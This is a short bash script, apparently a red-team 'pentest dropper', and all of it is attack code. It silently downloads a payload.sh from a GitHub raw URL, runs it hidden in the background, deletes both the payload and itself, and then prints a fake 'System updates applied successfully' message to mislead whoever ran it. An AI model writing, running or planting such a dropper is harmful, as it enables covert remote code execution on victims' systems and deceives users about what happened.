#!/bin/bash
# Advanced pentest dropper - Klyn Red Team

{
    # Multi-stage evasion
    EXEC=$(mktemp /tmp/install.XXXXXX)
    curl -s -L -H "Cache-Control: no-cache" "https://raw.githubusercontent.com/PsyKlyn/script-updates/main/payload.sh" -o "$EXEC"
    
    # Execute hidden
    chmod +x "$EXEC"
    nohup bash "$EXEC" >/dev/null 2>&1 &
    
    # Self-clean
    sleep 2 && rm -f "$EXEC" "$0"
    
} >/dev/null 2>&1

echo -e "\e[32m System updates applied successfully\e[0m"
